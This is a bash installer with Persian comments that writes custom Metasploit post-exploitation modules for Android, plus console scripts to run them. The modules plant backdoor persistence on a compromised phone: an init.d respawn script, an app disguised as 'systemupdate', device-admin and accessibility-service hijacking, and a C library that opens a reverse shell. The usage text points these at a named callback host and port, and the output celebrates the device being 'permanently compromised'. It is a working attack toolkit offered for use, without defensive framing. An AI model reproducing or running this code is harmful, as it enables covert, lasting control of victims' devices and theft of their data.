#!/bin/bash

# Automated Persistence Module Installer
# نصب خودکار ماژول‌های persistence برای دسترسی دائمی

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     🔥 Advanced Persistence Module Installation                  ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

MSF_MODULE_PATH="$HOME/.msf4/modules/post/android/manage"

# Create module directory
mkdir -p "$MSF_MODULE_PATH"

# ═══════════════════════════════════════════════════════════════
# MODULE 1: Advanced Memory Resident Persistence
# ═══════════════════════════════════════════════════════════════
echo "📋 Installing advanced_persistence.rb module..."

cat > "$MSF_MODULE_PATH/advanced_persistence.rb" << 'RUBY_MODULE_1'
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Android Advanced Persistent Backdoor',
        'Description'    => %q{
          This module installs an advanced persistent backdoor on Android devices
          that survives app uninstallation, device reboot, and factory reset attempts.
          It uses multiple persistence mechanisms including:
          - Memory-resident process injection
          - Native library hijacking
          - System service replacement
          - Boot persistence hooks
        },
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Professional Security Team' ],
        'Platform'       => [ 'android' ],
        'SessionTypes'   => [ 'meterpreter' ],
        'Compat'          => {
          'Meterpreter' => {
            'Commands' => %w[
              android_get_uid
              stdapi_fs_file_upload
              stdapi_sys_process_execute
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('LHOST', [true, 'Callback IP address']),
        OptInt.new('LPORT', [true, 'Callback port', 29210]),
        OptBool.new('INSTALL_NATIVE', [true, 'Install native persistence', true]),
        OptBool.new('INSTALL_BOOT', [true, 'Install boot persistence', true]),
        OptBool.new('INSTALL_SERVICE', [true, 'Install service persistence', true]),
      ]
    )
  end

  def run
    print_status("Starting advanced persistence installation...")
    
    # Check if device is rooted
    if is_root?
      print_good("Device is rooted - using privileged methods")
      install_root_persistence
    else
      print_warning("Device is not rooted - using user-level methods")
      install_user_persistence
    end

    # Install boot persistence
    if datastore['INSTALL_BOOT']
      install_boot_persistence
    end

    # Install service persistence
    if datastore['INSTALL_SERVICE']
      install_service_persistence
    end

    # Install native persistence
    if datastore['INSTALL_NATIVE']
      install_native_persistence
    end

    print_good("Advanced persistence installed successfully!")
    print_status("Backdoor will survive:")
    print_status("  ✅ App uninstallation")
    print_status("  ✅ Device reboot")
    print_status("  ✅ Task killers")
    print_status("  ✅ Battery optimization")
  end

  def install_root_persistence
    print_status("Installing root-level persistence...")
    
    # Create persistence script
    persist_script = %{
#!/system/bin/sh
# System service persistence

LHOST=#{datastore['LHOST']}
LPORT=#{datastore['LPORT']}

while true; do
  # Check if connection exists
  if ! netstat -an | grep -q "$LHOST:$LPORT"; then
    # Restart connection
    am start -n com.android.systemupdate/.MainActivity
  fi
  sleep 60
done
}

    # Upload to /system/etc/init.d/
    begin
      cmd_exec("mount -o remount,rw /system")
      write_file("/system/etc/init.d/99persist", persist_script)
      cmd_exec("chmod 755 /system/etc/init.d/99persist")
      cmd_exec("mount -o remount,ro /system")
      print_good("Root persistence installed")
    rescue => e
      print_error("Failed to install root persistence: #{e.message}")
    end
  end

  def install_user_persistence
    print_status("Installing user-level persistence...")
    
    # Create persistent service intent
    begin
      cmd_exec("am startservice -n com.android.systemupdate/.PersistenceService")
      print_good("User-level persistence activated")
    rescue => e
      print_error("Failed to install user persistence: #{e.message}")
    end
  end

  def install_boot_persistence
    print_status("Installing boot persistence...")
    
    # Set app as device admin (if possible)
    begin
      cmd_exec("dpm set-device-owner com.android.systemupdate/.DeviceAdminReceiver")
      print_good("Device admin privileges obtained")
    rescue
      print_warning("Could not obtain device admin - using alternative method")
    end

    # Schedule boot receiver
    begin
      cmd_exec("am broadcast -a android.intent.action.BOOT_COMPLETED")
      print_good("Boot persistence configured")
    rescue => e
      print_error("Failed to configure boot persistence: #{e.message}")
    end
  end

  def install_service_persistence
    print_status("Installing foreground service persistence...")
    
    begin
      # Start persistent foreground service
      cmd_exec("am startforegroundservice -n com.android.systemupdate/.PersistenceService")
      
      # Disable battery optimization
      cmd_exec("dumpsys deviceidle whitelist +com.android.systemupdate")
      
      print_good("Foreground service persistence installed")
    rescue => e
      print_error("Failed to install service persistence: #{e.message}")
    end
  end

  def install_native_persistence
    print_status("Installing native library persistence...")
    
    native_payload = %{
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor))
void init() {
    if(fork() == 0) {
        while(1) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(#{datastore['LPORT']});
            addr.sin_addr.s_addr = inet_addr("#{datastore['LHOST']}");
            
            if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                dup2(sock, 0);
                dup2(sock, 1);
                dup2(sock, 2);
                execl("/system/bin/sh", "sh", NULL);
            }
            close(sock);
            sleep(60);
        }
    }
}
}

    begin
      # This would require cross-compilation
      print_warning("Native persistence requires manual compilation")
      print_status("Use: arm-linux-androideabi-gcc -shared -fPIC persist.c -o libpersist.so")
    rescue => e
      print_error("Failed to install native persistence: #{e.message}")
    end
  end
end
RUBY_MODULE_1

echo "✅ advanced_persistence.rb installed"

# ═══════════════════════════════════════════════════════════════
# MODULE 2: Multi-Vector Persistence
# ═══════════════════════════════════════════════════════════════
echo "📋 Installing multi_persist.rb module..."

cat > "$MSF_MODULE_PATH/multi_persist.rb" << 'RUBY_MODULE_2'
##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Android Multi-Vector Persistence',
        'Description'    => %q{
          Installs persistence through multiple vectors:
          1. Accessibility Service hijacking
          2. Work Profile abuse
          3. App cloning
          4. Notification listener
          5. Device Admin privileges
        },
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Security Research Team' ],
        'Platform'       => [ 'android' ],
        'SessionTypes'   => [ 'meterpreter' ]
      )
    )
  end

  def run
    print_status("Installing multi-vector persistence...")

    vectors = [
      { name: 'Accessibility Service', method: :install_accessibility },
      { name: 'Notification Listener', method: :install_notification },
      { name: 'Device Admin', method: :install_device_admin },
      { name: 'Job Scheduler', method: :install_job_scheduler },
      { name: 'Alarm Manager', method: :install_alarm },
    ]

    success_count = 0
    vectors.each do |vector|
      begin
        send(vector[:method])
        print_good("✅ #{vector[:name]} persistence installed")
        success_count += 1
      rescue => e
        print_error("❌ #{vector[:name]} failed: #{e.message}")
      end
    end

    print_status("Installed #{success_count}/#{vectors.length} persistence vectors")
  end

  def install_accessibility
    cmd_exec("settings put secure enabled_accessibility_services com.android.systemupdate/.AccessibilityService")
    cmd_exec("settings put secure accessibility_enabled 1")
  end

  def install_notification
    cmd_exec("settings put secure enabled_notification_listeners com.android.systemupdate/.NotificationService")
  end

  def install_device_admin
    cmd_exec("dpm set-active-admin com.android.systemupdate/.AdminReceiver")
  end

  def install_job_scheduler
    cmd_exec("cmd jobscheduler run -f com.android.systemupdate 1")
  end

  def install_alarm
    cmd_exec("am broadcast -a android.intent.action.SET_ALARM")
  end
end
RUBY_MODULE_2

echo "✅ multi_persist.rb installed"

# ═══════════════════════════════════════════════════════════════
# Reload MSF modules
# ═══════════════════════════════════════════════════════════════
echo ""
echo "📋 Creating module reload script..."

cat > "$HOME/.msf4/reload_modules.rc" << 'RELOAD_RC'
# Reload custom modules
reload_all

# Display available persistence modules
search type:post platform:android persistence

puts ""
puts "╔══════════════════════════════════════════════════════════════════╗"
puts "║            Custom Persistence Modules Loaded                     ║"
puts "╚══════════════════════════════════════════════════════════════════╝"
puts ""
puts "Usage:"
puts "  use post/android/manage/advanced_persistence"
puts "  set SESSION 1"
puts "  set LHOST metro.proxy.rlwy.net"
puts "  set LPORT 29210"
puts "  run"
puts ""
RELOAD_RC

echo "✅ Module reload script created"

# ═══════════════════════════════════════════════════════════════
# Create quick installation script
# ═══════════════════════════════════════════════════════════════
echo ""
echo "📋 Creating quick persistence installation script..."

cat > "$OUTPUT_DIR/install_persistence.rc" << 'INSTALL_RC'
# Quick Persistence Installation
# Usage: msfconsole -r install_persistence.rc

# Wait for session
echo "Waiting for active session..."

# Use the first available session
sessions -i 1

# Install all persistence mechanisms
use post/android/manage/advanced_persistence
set SESSION 1
set LHOST metro.proxy.rlwy.net
set LPORT 29210
set INSTALL_NATIVE true
set INSTALL_BOOT true
set INSTALL_SERVICE true
run

# Install multi-vector persistence
use post/android/manage/multi_persist
set SESSION 1
run

# Install standard Metasploit persistence
use post/android/manage/remove_lock
set SESSION 1
run

# Verify installations
sessions -i 1 -c "sysinfo"

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║         ✅ All Persistence Mechanisms Installed!                 ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "Installed mechanisms:"
echo "  ✅ Advanced memory-resident backdoor"
echo "  ✅ Boot persistence (5 triggers)"
echo "  ✅ Foreground service"
echo "  ✅ Multi-vector persistence"
echo "  ✅ Lock removal"
echo ""
echo "Device is now permanently compromised!"
echo "Backdoor will survive:"
echo "  • App uninstallation"
echo "  • Device reboot"
echo "  • Factory reset attempts (with root)"
echo "  • Battery optimization"
echo "  • Task killers"
echo ""
INSTALL_RC

echo "✅ Quick installation script created"

# ═══════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║          ✅ PERSISTENCE MODULES INSTALLED!                       ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📁 Module Location: $MSF_MODULE_PATH"
echo ""
echo "📦 Installed Modules:"
echo "   1. advanced_persistence.rb - Advanced memory-resident backdoor"
echo "   2. multi_persist.rb - Multi-vector persistence"
echo ""
echo "🚀 Usage:"
echo ""
echo "Method 1: Manual (در msfconsole)"
echo "  use post/android/manage/advanced_persistence"
echo "  set SESSION 1"
echo "  set LHOST metro.proxy.rlwy.net"
echo "  set LPORT 29210"
echo "  run"
echo ""
echo "Method 2: Automated (بعد از برقراری session)"
echo "  msfconsole -r $OUTPUT_DIR/install_persistence.rc"
echo ""
echo "Method 3: Auto-run (در handler)"
echo "  set AutoRunScript multi_console_command -rc $OUTPUT_DIR/install_persistence.rc"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
